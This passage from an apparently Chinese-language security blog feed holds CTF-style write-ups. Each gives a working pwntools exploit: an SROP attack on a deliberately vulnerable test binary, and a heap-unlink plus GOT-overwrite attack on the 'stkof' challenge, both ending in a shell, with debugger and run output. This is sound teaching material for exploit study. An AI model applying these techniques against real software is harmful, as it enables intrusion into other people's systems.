class="line"></span><br><span class="line">void syscall_()&#123;</span><br><span class="line">    __asm__("syscall; ret;");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void set_rax()&#123;</span><br><span class="line">    __asm__("movl $0xf, %eax; ret;");</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    // ONLY SROP!</span><br><span class="line">    char buff[100];</span><br><span class="line">    printf("Buff @%p, can you SROP?\n", buff);</span><br><span class="line">    read(0, buff, 5000);</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ checksec ./x64simple</span><br><span class="line">[*] './x64simple'</span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure></p><p>这里为什么把保护全关呢。因为起初的利用思路是调用 mprotect 系统调用对栈内存属性改写，实现栈缓冲区可执行</p><p>然而在实践的过程问题却发现行不通：在 NX 的条件下，对栈缓冲区内存改写属性会失败。</p><h2><span id="1定位崩溃点">1.定位崩溃点</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[ Legend: Modified <span class="keyword">register</span> | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line">$rax   : <span class="number">0x0</span></span><br><span class="line">$rbx   : <span class="number">0x0</span></span><br><span class="line">$rcx   : <span class="number">0x37b</span></span><br><span class="line">$rdx   : <span class="number">0x1f4</span></span><br><span class="line">$rsp   : <span class="number">0x7ffffffee238</span>      -&gt;  <span class="string">"paaaaaaaqa"</span></span><br><span class="line">$rbp   : <span class="number">0x616161616161616f</span> (<span class="string">"oaaaaaaa"</span>?)</span><br><span class="line">$rsi   : <span class="number">0x7ffffffee1c0</span>      -&gt;  <span class="string">"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga[...]"</span></span><br><span class="line">$rdi   : <span class="number">0x0</span></span><br><span class="line">$rip   : <span class="number">0x400599</span>            -&gt;  &lt;main+<span class="number">60</span>&gt; ret</span><br><span class="line">$r8    : <span class="number">0x1</span></span><br><span class="line">$r9    : <span class="number">0x24</span></span><br><span class="line">$r10   : <span class="number">0x37b</span></span><br><span class="line">$r11   : <span class="number">0x37b</span></span><br><span class="line">$r12   : <span class="number">0x400450</span>            -&gt;  &lt;_start+<span class="number">0</span>&gt; xor ebp, ebp</span><br><span class="line">$r13   : <span class="number">0x7ffffffee310</span>      -&gt;  <span class="number">0x0000000000000001</span></span><br><span class="line">$r14   : <span class="number">0x0</span></span><br><span class="line">$r15   : <span class="number">0x0</span></span><br><span class="line">$eflags: [CARRY PARITY adjust zero sign trap INTERRUPT direction overflow RESUME virtualx86 identification]</span><br><span class="line">$fs: <span class="number">0x0000</span>  $gs: <span class="number">0x0000</span>  $ss: <span class="number">0x002b</span>  $es: <span class="number">0x0000</span>  $ds: <span class="number">0x0000</span>  $cs: <span class="number">0x0033</span></span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────[ <span class="built_in">stack</span> ]────</span><br><span class="line"><span class="number">0x00007ffffffee238</span>|+<span class="number">0x00</span>: <span class="string">"paaaaaaaqa"</span>   &lt;- $rsp</span><br><span class="line"><span class="number">0x00007ffffffee240</span>|+<span class="number">0x08</span>: <span class="number">0x00000000000a6171</span> (<span class="string">"qa"</span>?)</span><br><span class="line"><span class="number">0x00007ffffffee248</span>|+<span class="number">0x10</span>: <span class="number">0x00007ffffffee318</span>  -&gt;  <span class="number">0x00007ffffffee51f</span>  -&gt;  <span class="string">"./x64simple[...]"</span></span><br><span class="line"><span class="number">0x00007ffffffee250</span>|+<span class="number">0x18</span>: <span class="number">0x00000001ff1c12c8</span></span><br><span class="line"><span class="number">0x00007ffffffee258</span>|+<span class="number">0x20</span>: <span class="number">0x000000000040055d</span>  -&gt;  &lt;main+<span class="number">0</span>&gt; push rbp</span><br><span class="line"><span class="number">0x00007ffffffee260</span>|+<span class="number">0x28</span>: <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x00007ffffffee268</span>|+<span class="number">0x30</span>: <span class="number">0xec7013cae5dbabc5</span></span><br><span class="line"><span class="number">0x00007ffffffee270</span>|+<span class="number">0x38</span>: <span class="number">0x0000000000400450</span>  -&gt;  &lt;_start+<span class="number">0</span>&gt; xor ebp, ebp</span><br></pre></td></tr></table></figure><p>通过 gdb 调试，rsp - rsi 得到 padding size == 120</p><h2><span id="2-寻找-gadgets">2. 寻找 gadgets</span></h2><p>利用ropper可搜寻到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">syscall_addr = <span class="number">0x40054a</span></span><br><span class="line">mov_eax_15_ret = <span class="number">0x400554</span></span><br></pre></td></tr></table></figure><h2><span id="3fake-signal-frame">3.fake signal frame</span></h2><p>调用 execve 系统调用，可直接使用 pwntools 中的 srop 框架<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line"><span class="comment"># execve syscall number == 59</span></span><br><span class="line">frame.rax = <span class="number">59</span> <span class="comment"># execve syscall number</span></span><br><span class="line">frame.rdi = buff_addr</span><br><span class="line">frame.rsi = <span class="number">0</span> </span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line"><span class="comment"># signal frame size == 248</span></span><br><span class="line">frame.rsp = buff_addr + len(payload) + <span class="number">248</span></span><br><span class="line"><span class="comment"># SET RIP TO SYSCALL ADDRESS</span></span><br><span class="line">frame.rip = syscall_ret</span><br></pre></td></tr></table></figure></p><h2><span id="4完整-exp-及-getshell">4.完整 exp 及 getshell</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-* coding:utf-8 *-</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from Frame import SigreturnFrame</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"><span class="comment"># context.log_level = "DEBUG"</span></span><br><span class="line"></span><br><span class="line">mov_eax_15_ret = <span class="number">0x400554</span></span><br><span class="line">syscall_ret = <span class="number">0x40054a</span></span><br><span class="line">main_addr = <span class="number">0x400565</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./x64simple"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.leak buffer addr</span></span><br><span class="line">p.recvuntil(<span class="string">"Buff @0x"</span>)</span><br><span class="line">buff_addr = int(p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"buff addr:"</span>,hex(buff_addr)</span><br><span class="line">p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">binsh = <span class="string">"/bin/sh\x00"</span></span><br><span class="line"></span><br><span class="line">payload = binsh + (<span class="number">120</span>-len(binsh))*<span class="string">'\x90'</span></span><br><span class="line"><span class="comment"># why? sigreturn syscall number is 15,syscall arg by eax passed</span></span><br><span class="line">payload += p64(mov_eax_15_ret) + p64(syscall_ret)</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame() <span class="comment"># CREATING A SIGRETURN FRAME</span></span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = buff_addr</span><br><span class="line">frame.rsi = <span class="number">0</span> </span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rsp = buff_addr + len(payload) + <span class="number">248</span> <span class="comment"># WHERE 248 IS SIZE OF FAKE FRAME!</span></span><br><span class="line">frame.rip = syscall_ret <span class="comment"># SET RIP TO SYSCALL ADDRESS</span></span><br><span class="line"><span class="comment"># PLACE FAKE FRAME ON STACK</span></span><br><span class="line"><span class="comment"># payload += p64(main_addr) + str(frame)</span></span><br><span class="line">payload += str(frame)</span><br><span class="line">payload += p64(main_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for debuger</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">$python ./pwn_x64simple.py </span><br><span class="line">[+] Starting local process <span class="string">'./x64simple'</span>: pid <span class="number">13214</span></span><br><span class="line">buff addr: <span class="number">0x7ffeb5211770</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">asan</span><br></pre></td></tr></table></figure><h1><span id="reference">Reference</span></h1><ul><li>sides:<a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf" target="_blank" rel="external">https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf</a></li><li>paper:<a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="external">http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf</a></li><li><a href="http://www.freebuf.com/articles/network/87447.html" target="_blank" rel="external">http://www.freebuf.com/articles/network/87447.html</a></li><li>示例：<a href="https://0x00sec.org/t/srop-signals-you-say/2890" target="_blank" rel="external">https://0x00sec.org/t/srop-signals-you-say/2890</a></li><li><a href="https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h" target="_blank" rel="external">https://elixir.bootlin.com/linux/v4.6/source/arch/x86/include/uapi/asm/sigcontext.h</a></li><li><a href="http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html" target="_blank" rel="external">http://www-numi.fnal.gov/offline_software/srt_public_context/WebDocs/Errors/unix_system_errors.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Sigreturn Oriented Programming，基于 signal mechanism 的内存溢出攻击&lt;/p&gt;
&lt;p&gt;缺陷可利用：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;进程 context info 及 rt_sigreturn addr 保存在用户进程栈空间，用户进程
      
    
    </summary>
    
      <category term="exploit" scheme="https://asanzjx.github.io/categories/exploit/"/>
    
    
      <category term="exp" scheme="https://asanzjx.github.io/tags/exp/"/>
    
      <category term="signal" scheme="https://asanzjx.github.io/tags/signal/"/>
    
      <category term="syscall" scheme="https://asanzjx.github.io/tags/syscall/"/>
    
  </entry>
  
  <entry>
    <title>stkof heap unlink 实战详解</title>
    <link href="https://asanzjx.github.io/2018/10/21/stkof_detail/"/>
    <id>https://asanzjx.github.io/2018/10/21/stkof_detail/</id>
    <published>2018-10-21T06:00:00.000Z</published>
    <updated>2018-10-21T08:04:44.097Z</updated>
    
    <content type="html"><![CDATA[<p>实验环境：</p><ul><li>pwntools:3.12.1</li><li>wsl debian</li><li>libc:2.24</li><li>gdb+gef,IDA</li></ul><p>checksec:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec ./stkof</span><br><span class="line">[*] './stkof'</span><br><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p><p>breakpoints:</p><ul><li>main ep:0x400c58</li><li>获取四个函数的输入值: b *0x400d16</li></ul><h1><span id="patch-alarm">patch alarm()</span></h1><p>调试时第一坑就是 alarm() 运行时间警告，</p><p>0x400c6f-0x40078</p><p>使用 keypatch patch 掉就可以。</p><h1><span id="程序的四个主功能">程序的四个主功能</span></h1><p>IDA F5 查看对照着汇编代码总算找到了点眉目。首先程序运行开始 while 循环</p><p>要求输入，根据输入值调用不同function，输入值为 1~4，如果输入为其他值会提示”FAIL”</p><p>这个时候会申请一段内存，0x210，0xe05010，存储输入的值</p><p>结合 objdump -R ./stkof 查看重定位表，可摸索出这四个 function 的逻辑</p><ul><li>0x400cac Malloc_1，将输入的值作为大小然后分配内存，然后 print 当前分配的堆序号 换行 “OK”</li><li>0x400cbb Fread_2，第一次获取输入的堆块序号，判断是否在堆里，第二次获取输入的大小，第三次获取输入的值然后写入对应序号的堆内存里，输出 “OK” 换行</li><li>0x400cca Free_3，获取堆序号输入，free 堆序号对应的堆内存</li><li>0x400cd9 Fgets_strlen_put</li></ul><p>执行成功输出 “OK”，这个时候也会申请一段内存，0x210，0xe05280，存储 “OK” 值，继续 while 循环</p><ul><li>.bss addr: 0x6020c0 </li><li>.got.plt: 0x60200</li><li>存储申请的堆地址：0x6020c0+0x88,0x602148</li></ul><h1><span id="利用思路">利用思路</span></h1><ol><li>连续申请三次堆，这样第二个和第三个堆内存物理相连</li><li>覆写2号堆，伪造 chunk</li><li>free 3 号堆,bypass unlink</li><li>编辑 2 号堆覆写 free got 内容为 puts plt，leak function addr</li><li>计算得到 system() addr</li><li>接下来有两种思路可getshell:</li></ol><ul><li>再次覆写 free got 为 system addr,然后申请一个堆，写入”/bin/sh”, 再 free 掉这个堆即可实现 getshell</li><li>覆写 atoi got 为 system addr,这样程序在陷入获取功能序号的时候，输入 ‘/bin/sh’,调用 atoi 转换也可实现 getshell</li></ul><h1><span id="getshell-脚本及执行过程">getshell 脚本及执行过程</span></h1><p>这里采用第一种覆写 free got 的方式 getshell，因为比较稳<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-* coding:utf -*</span></span><br><span class="line"></span><br><span class="line"><span class="string">"""</span><br><span class="line">python 2.7</span><br><span class="line">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(p)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(<span class="string">"128"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(p,idx,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.send(content)</span><br><span class="line">    p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(p,idx)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc-2.24.so"</span>)</span><br><span class="line">stkof = ELF(<span class="string">"./stkof"</span>)</span><br><span class="line">p = process(<span class="string">"./stkof"</span>)</span><br><span class="line">g_addr = <span class="number">0x602150</span></span><br><span class="line"></span><br><span class="line">alloc(p)</span><br><span class="line">alloc(p)</span><br><span class="line">alloc(p)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'\x00'</span>*<span class="number">0x10</span> + p64(g_addr<span class="number">-0x18</span>) + p64(g_addr<span class="number">-0x10</span>) + <span class="string">'a'</span>*<span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(p,<span class="number">2</span>,payload1)</span><br><span class="line"><span class="comment"># 1.bypass unlink</span></span><br><span class="line">free(p,<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">"OK\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.overwrite got table</span></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(stkof.got[<span class="string">"free"</span>]) + p64(stkof.got[<span class="string">"puts"</span>])</span><br><span class="line">edit(p,<span class="number">2</span>,payload2)</span><br><span class="line"></span><br><span class="line">payload3 = p64(stkof.plt[<span class="string">"puts"</span>])</span><br><span class="line">edit(p,<span class="number">1</span>,payload3)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.leak puts addr</span></span><br><span class="line">free(p,<span class="number">2</span>)</span><br><span class="line"><span class="comment"># puts_addr = u64(p.recv(6) + "\x00\x00")</span></span><br><span class="line"><span class="comment"># puts_addr = p.recv(6).strip().ljust(8,"\x00")</span></span><br><span class="line"><span class="comment"># p.recv(4)</span></span><br><span class="line">puts_addr = p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">p.recv(<span class="number">4</span>)</span><br><span class="line">puts_addr = u64(puts_addr)</span><br><span class="line"><span class="keyword">print</span> hex(puts_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">system_addr = puts_addr - libc.symbols[<span class="string">"puts"</span>] + libc.symbols[<span class="string">"system"</span>]</span><br><span class="line"><span class="comment"># binsh_addr = puts_addr - libc.symbols["puts"] + next(libc.search('/bin/sh'))</span></span><br><span class="line">log.success(<span class="string">'system addr: '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.continue overwrite got table</span></span><br><span class="line">payload4 = p64(system_addr)</span><br><span class="line">edit(p,<span class="number">1</span>,payload4)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5.exec sh</span></span><br><span class="line">alloc(p)</span><br><span class="line">binsh=<span class="string">"/bin/sh\x00"</span></span><br><span class="line">edit(p,<span class="number">4</span>,binsh)</span><br><span class="line">context.terminal = [<span class="string">'./stkof'</span>, <span class="string">'-e'</span>, <span class="string">'sh'</span>, <span class="string">'-c'</span>]</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">log.info(<span class="string">"[Exec sh...]"</span>)</span><br><span class="line">free(p,<span class="number">4</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">$ python ./stkof_pwn.py DEBUG</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f880</span> realloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f890</span> __tls_get_addr</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f8b0</span> memalign</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f8e0</span> _dl_find_dso_for_object</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f900</span> calloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f930</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x1f938</span> free</span><br><span class="line">[*] <span class="string">'/mnt/d/workplace/CTF/2014hctf/stkof/libc-2.24.so'</span></span><br><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">[DEBUG] PLT <span class="number">0x40074c</span> free</span><br><span class="line">[DEBUG] PLT <span class="number">0x400760</span> puts</span><br><span class="line">[DEBUG] PLT <span class="number">0x400770</span> fread</span><br><span class="line">[DEBUG] PLT <span class="number">0x400780</span> strlen</span><br><span class="line">[DEBUG] PLT <span class="number">0x400790</span> __stack_chk_fail</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007a0</span> printf</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007b0</span> alarm</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007c0</span> __libc_start_main</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007d0</span> fgets</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007e0</span> atoll</span><br><span class="line">[DEBUG] PLT <span class="number">0x4007f0</span> __gmon_start__</span><br><span class="line">[DEBUG] PLT <span class="number">0x400800</span> malloc</span><br><span class="line">[DEBUG] PLT <span class="number">0x400810</span> fflush</span><br><span class="line">[DEBUG] PLT <span class="number">0x400820</span> atol</span><br><span class="line">[DEBUG] PLT <span class="number">0x400830</span> atoi</span><br><span class="line">[*] <span class="string">'/mnt/d/workplace/CTF/2014hctf/stkof/stkof'</span></span><br><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x400000</span>)</span><br><span class="line">[+] Starting local process <span class="string">'./stkof'</span>: pid <span class="number">390</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'128\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'128\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'1\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'128\n'</span></span><br><span class="line">[DEBUG] Received <span class="number">0x5</span> bytes:</span><br><span class="line"><span class="string">'3\n'</span></span><br><span class="line"><span class="string">'OK\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x2</span> bytes:</span><br><span class="line"><span class="string">'2\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x4</span> bytes:</span><br><span class="line"><span class="string">'144\n'</span></span><br><span class="line">[DEBUG] Sent <span class="number">0x90</span> bytes:</span><br><span class="line"><span class="number">00000000</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span 